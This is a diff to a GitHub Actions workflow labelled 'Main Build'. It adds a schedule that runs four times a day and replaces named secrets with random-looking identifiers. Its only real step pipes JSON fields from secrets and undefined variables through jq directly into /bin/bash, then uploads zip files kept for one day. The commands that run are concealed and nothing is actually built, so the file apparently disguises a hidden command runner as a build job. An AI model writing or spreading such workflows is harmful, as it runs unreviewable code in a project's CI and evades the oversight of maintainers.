@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '5 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,15 +24,18 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          dgq70866: ${{ secrets.dgq70866 }}
+          swx44: ${{ secrets.swx44 }}
         run: |
-          printf '%s' "$dgq70866" | jq -r .w389 | /bin/bash
-          echo $uk765 | jq -r .dd6745 | /bin/bash
+          printf '%s' "$swx44" | jq -r .ii71 | /bin/bash
+          printf '%s' "$y7772" | jq -r .z08688 | /bin/bash
+          printf '%s' "$ez26026" | jq -r .dumgl692 | /bin/bash
+          echo $n631 | jq -r .th541 | /bin/bash
+          echo $lzaae05 | jq -r .apyy351 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: azde4nlq
+          name: gIkeH4L3
           path: "*.zip"
           retention-days: 1
